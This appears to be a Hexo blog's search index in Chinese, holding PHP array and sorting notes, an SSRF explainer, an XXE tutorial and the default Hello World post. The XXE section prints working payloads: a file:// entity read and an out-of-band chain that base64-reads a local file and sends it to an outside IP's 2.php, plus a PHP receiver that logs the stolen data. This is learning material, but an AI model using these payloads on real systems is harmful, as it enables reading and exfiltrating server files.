//取得数组中当前指针所在单元的值；</p><p>​        $re = key( $arr1 );      //取得数组中当前指针所在单元的键（下标）；</p><p>​        $re = next( $arr1 );      //将数组中的指针往后移动一个位置，并取得新位置上的值；</p><p>​        $re = prev( $arr1 );      //将数组中的指针往前移动一个位置，并取得新位置上的值；</p><p>​        $re = end( $arr1 );      //将数组中的指针移动到最后一个位置，并取得新位置上的值；</p><p>​        $re = reset($arr1);      //将数组中的指针移动到最前一个位置，并取得新位置上的值；</p><h2 id="常用数组函数"><a href="#常用数组函数" class="headerlink" title="常用数组函数"></a>常用数组函数</h2><p>max()：     获取一个数组中的最大值</p><p>min()：      获取一个数组中的最小值</p><p>count()：     获取一个数组的元素个数</p><p>in_array()：  判断一个数据是否在指定数组中。</p><p>语法形式：$b = in_array( $数组， 数据); //结果true或false</p><p>range()：         生成某个范围的连续值的数组，比如range(3, 9)会得到数组：array(3, 4, 5, 6, 7, 8, 9, );</p><p>array_keys()：    取出一个数组中的所有“键”并放入一个索引数组中。</p><p>array_values()：  取出一个数组中的所有“值”并放入一个索引数组中。</p><p>array_push()：    将一个或多个数据放入一个数组的“末端”。</p><p>array_pop()：     将一个数组的最后一个单元删除，并返回该单元的值。</p><p>array_reverse()：  将一个数组的所有单元的顺序进行反转（最前的放最后，最后的放最前）</p><h2 id="数组排序算法（重点-难点）"><a href="#数组排序算法（重点-难点）" class="headerlink" title="==数组排序算法（重点/难点）=="></a>==数组排序算法（重点/难点）==</h2><p><strong>数组的排序问题</strong></p><p>常用的排序函数：sort, rsort, asort, arsort</p><p>数组排序函数大全：</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527184939.png" alt="" loading="lazy"></p><p><strong>冒泡排序算法</strong></p><p>原理：</p><p>​        遍历一个数组，在此过程中，将相邻的两个单元的值进行比较：如果前面的比后面的大，则将两个值交换位置。这个过程到最后，数组中的最大值一定放在最后位置了。</p><p>​        如果将上述过程再进行一遍，则又可以确定剩余数据中的最大值放在倒数第二的位置。</p><p>​        然后将上述过程继续进行一遍，则可以继续确定剩余数据中的最大值放在倒数第三的位置。</p><p>​        依次类推。。。。。。进行若干次，就排好了。</p><p>图示：</p><p>​        有数组：$arr1 = array(18, 22, 12,  15, 23, 9);</p><table><thead><tr><th>原始数组</th><th>18</th><th>22</th><th>12</th><th>15</th><th>23</th><th>9</th></tr></thead><tbody><tr><td>第1趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>第2趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>第3趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>第4趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>第5趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><strong>选择排序算法</strong></p><p>原理：</p><p>​        遍历一个数组，在此过程中，找出数组中的最大值及其位置。然后将该最大值的单元，跟数组的最后一个单元“交换位置”，这样进行一趟，数组中的最大值就一定放在最后位置了。</p><p>​        将上述过程中剩余的数据继续遍历一次，并做同样的事情，则此时剩余部分的最大值也能够放在剩余部分的最后位置——对整体而言就是倒数第二的位置。</p><p>​        依此类推。。。。。。。进行若干次，就排好了。</p><p>图示：</p><p>​        有数组：$arr1 = array(18, 22, 12,  15, 23, 9);</p><table><thead><tr><th>原始数组</th><th>18</th><th>22</th><th>12</th><th>15</th><th>23</th><th>9</th></tr></thead><tbody><tr><td>第1趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>第2趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>第3趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>第4趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>第5趟之后</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200527185140.png" alt="" loading="lazy"></p><h2 id="数组查找算法"><a href="#数组查找算法" class="headerlink" title="数组查找算法"></a>数组查找算法</h2><p>查找算法，就是从一个数组中，找一个“目标”（可以是值，也可以是键）的算法。</p><p>数组的查找函数：</p><p>​        in_array()         ：在一个数组中找是否存在某个数据。</p><p>​        array_search()     ： 在数组中搜索给定的值，如果成功则返回相应的键名</p><p>​        array_key_exists() ： 检查给定的键名或索引是否存在于数组中</p><p>一种查找算法：</p><p>遍历查找：不值得一提！</p><p><strong>二分查找</strong></p><p>此查找算法针对的数组有以下条件：</p><p>​        1. 索引数组；</p><p>​        2. 数组是已经排好序的了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-服务器端请求伪造</title>
      <link href="/2020/04/06/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2020/04/06/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是SSRF？"><a href="#一、什么是SSRF？" class="headerlink" title="一、什么是SSRF？"></a>一、什么是SSRF？</h1><p>​        服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。==(利用一个可发起网络请求的服务当作跳板来攻击其他服务)==</p><p>​        攻击者能够利用目标帮助攻击者访问其他想要攻击的目标</p><p>​        A让B帮忙访问C</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200322150615.png" alt="" loading="lazy"></p><h3 id="能用ssrf做什么（危害）："><a href="#能用ssrf做什么（危害）：" class="headerlink" title="能用ssrf做什么（危害）："></a>能用ssrf做什么（危害）：</h3><ul><li>扫描内部网络</li><li>向内部==任意主机==的==任意端口==发送精心构造的数据包</li><li>dos（请求大文件，始终保持连接）</li><li>暴力穷举</li></ul><h1 id="二、SSRF攻击"><a href="#二、SSRF攻击" class="headerlink" title="二、SSRF攻击"></a>二、SSRF攻击</h1><h3 id="如何挖掘SSRF漏洞"><a href="#如何挖掘SSRF漏洞" class="headerlink" title="如何挖掘SSRF漏洞"></a>如何挖掘SSRF漏洞</h3><p>​        能够对外发起网络请求的地方，就可能存在SSRF漏洞。(POST或GET)</p><p>​        eg:<a href="http://example.com/index.php?page=about.php" target="_blank" rel="noopener">http://example.com/index.php?page=about.php</a></p><p>​    从远程服务器请求资源。</p><p>​        数据库内置功能。（MSSQL）OpenRowset函数操作远程数据库（操作内网的数据库）</p><p><a href="https://www.cnblogs.com/yechanglv/p/6923147.html" target="_blank" rel="noopener">https://www.cnblogs.com/yechanglv/p/6923147.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE - 实体注入</title>
      <link href="/2020/04/05/XXE%20-%20%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/04/05/XXE%20-%20%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是XXE"><a href="#一、什么是XXE" class="headerlink" title="一、什么是XXE?"></a>一、什么是XXE?</h1><p>​        <strong>XXE = XML External Entity 即外部实体，从安全角度理解成XML External Entity attack XML外部实体注入攻击</strong></p><p><strong>典型的攻击如下：</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200324121519.png" alt="" loading="lazy"></p><p>定义实体必须写在DTD部分</p><h1 id="二、什么是XML"><a href="#二、什么是XML" class="headerlink" title="二、什么是XML?"></a>二、什么是XML?</h1><h3 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML?"></a>什么是 XML?</h3><ul><li><p>XML 指可扩展标记语言（EXtensible Markup Language）</p></li><li><p>XML 是一种标记语言，很类似 HTML</p></li><li><p>XML 的设计宗旨是传输数据，而非显示数据</p></li><li><p>XML 标签没有被预定义。您需要自行定义标签。</p></li><li><p>XML 被设计为具有自我描述性。</p></li><li><p>XML 是 W3C 的推荐标准</p></li></ul><p><strong>特点：</strong></p><ul><li><p>XML仅仅是纯文本，他不会做任何事情。</p></li><li><p>XML可以自己发明标签（允许定义自己的标签和文档结构）</p></li><li><p>XML 无所不在。XML 是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行。（<strong>这玩意就是个储存数据的</strong>）</p></li></ul><h1 id="三、XXE原理"><a href="#三、XXE原理" class="headerlink" title="三、XXE原理"></a>三、XXE原理</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$test =<span class="string">&lt;&lt;&lt;EOF</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=c:/1.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.32.146/xxe/1.xml"</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">EOF;</span><br><span class="line">$obj = simplexml_load_string($test, 'SimpleXMLElement', LIBXML_NOENT);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>​        有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，==攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）==</p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200324122234.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200324122336.png" alt="" loading="lazy"></p><h4 id="php中存在一个叫做-simplexml-load-string-的函数"><a href="#php中存在一个叫做-simplexml-load-string-的函数" class="headerlink" title="php中存在一个叫做==simplexml_load_string==的函数"></a>php中存在一个叫做==simplexml_load_string==的函数</h4><p>​        这个函数是将XML转化为对象</p><p>​         实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$test = <span class="string">'&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM "file:///c:/1.txt"&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;'</span>;</span></span><br><span class="line"><span class="php">$obj = simplexml_load_string($test, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span></span><br><span class="line"><span class="php">print_r($obj);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>变量test里面是XML</strong></p><p>然后试用simplexml_load_string将其转化为对象，第一个参数是xml语句，SimpleXMLElement是调用了SimpleXMLElement这个类，然后LIBXML_NOENT是替代实体，==然后他去执行了file协议去读取我的文件==</p><p><strong>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</strong></p><p><img src="https://gitee.com/ghat/blogimage/raw/master/img/20200324124008.png" alt="" loading="lazy"></p><h3 id="炮台"><a href="#炮台" class="headerlink" title="炮台"></a>炮台</h3><p>​    <strong>很多时候后端语言解析了XML后其实并不会给你输出</strong>。</p><p>​    我们可以使用一个类似与接受平台一样的接受器，XML读取数据然后发送到接收的平台，然后接收平台存储，我们再去接收平台查看就可以了。有点像是反弹注入的感觉</p><p>​    我们先读取我们想要的文件，然后为了传输方便，我们先来个base64编码，我们可以使用php伪协议读取文件（仅PHP支持）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=c:/1.txt</span></span><br></pre></td></tr></table></figure><p> 然后我们再去调用一个外部xml 比如1.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.19.131/1.xml"</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta-string">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://120.203.13.75:8123/xxe/2.php?id=%file;'&gt;"</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">\&gt;</span></span><br><span class="line"></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p> 这个1.xml会被加载到原本的xml,然后我们最后来调用，然后你读取出来的文件会用get传参的方式传参给2.php 然后2.php记录下来储存到3.txt中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">"3.txt"</span>,$_GET[<span class="string">"id"</span>],FILE_APPEND);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/04/05/hello-world/"/>
      <url>/2020/04/05/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
